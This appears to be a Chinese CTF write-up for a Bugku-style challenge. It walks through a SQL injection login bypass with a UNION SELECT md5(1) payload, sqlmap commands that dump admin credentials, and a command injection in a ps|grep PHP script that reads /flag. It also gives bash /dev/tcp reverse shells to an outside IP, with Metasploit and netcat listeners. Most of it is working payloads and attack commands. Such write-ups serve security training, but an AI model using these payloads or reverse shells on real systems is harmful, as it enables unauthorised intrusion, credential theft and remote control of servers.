## 源码

```php
$sql="SELECT username,password FROM admin WHERE username='".$username."'";
if (!empty($row) && $row['password']===md5($password)){
}
```

## playload

```payload
username=' union select 1,md5(1)#&password=1
```

执行这条语句时由于前面的username为空，所以没有数据返回，但后面的union select md5(1),md5(1)则会返回两个MD5(1)的值，然后password我们也置为1，从而绕过if语句的判断。

###还原语句为：

```
SELECT username,password FROM admin WHERE username='' union select 1,md5(1)-- -&password=1'
```

此时我们可以 username=''， 两个 sql 语句进行联合操作时，当前一个语句选择的内容为空， 我们这里就将后面的语句的内容显示出来

## sqlmap

```sh
sqlmap -r burp_sql.txt --level 5 --batch

sqlmap -r burp_sql.txt --dbs
sqlmap -r sql.txt  --dbs -D bugkuctf --tables
sqlmap -r sql.txt  --dbs -D bugkuctf -T admin --columns
sqlmap -r sql.txt  --dbs -D bugkuctf -T admin -C username,password --dump
```

## 登录成功...

```
apache 6414 0.0 0.0 11348 1256 ? S 02:08 0:00 sh -c ps -aux | grep 123
apache 6416 0.0 0.0 6428 592 ? S 02:08 0:00 grep 123
```

```
123|ls
```

没有回显 

### 采用写入文件二次返回的方法查看结果

```
123|ls ../../../>test
访问 http://114.67.246.176:11727/test
123|cat /flag>test
访问 http://114.67.246.176:11727/test
```

### msf

```ruby
c=123 ; bash -i >& /dev/tcp/47.95.142.60/4444 0>&1

use exploit/multi/handler
set payload linux/armle/shell/reverse_tcp
set lport 4444
set lhost 47.95.142.60
exploit 
```

### nc

```
nc -lvv 8080

|bash -i >& /dev/tcp/47.95.142.60/8080 0>&1
```



## 控制回显

```php
<?php
if(isset($_POST['c'])){
        $cmd = $_POST['c'];
        exec('ps -aux | grep '.$cmd, $result);
        foreach($result as $k){
                if(strpos($k, $cmd)){
                        echo $k.'<br>';
                }
        }
}
?>
```